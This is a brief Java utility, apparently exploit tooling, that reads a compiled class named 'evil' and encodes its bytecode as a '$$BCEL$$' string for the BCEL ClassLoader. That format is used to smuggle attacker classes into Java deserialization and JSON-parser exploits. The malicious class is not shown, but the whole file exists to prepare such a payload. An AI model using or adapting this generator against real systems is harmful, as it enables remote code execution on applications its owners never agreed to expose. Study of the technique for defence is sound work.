import javassist.ClassPool;
import org.apache.bcel.classfile.Utility;


public class bcelEncode {
    public static String bcelEncode(String classFile) throws Exception {

        return "$$BCEL$$" + Utility.encode(ClassPool.getDefault().get(classFile).toBytecode(), true);
    }

    public static void main(String[] args) throws Exception{
        System.out.println(bcelEncode("evil"));
    }
}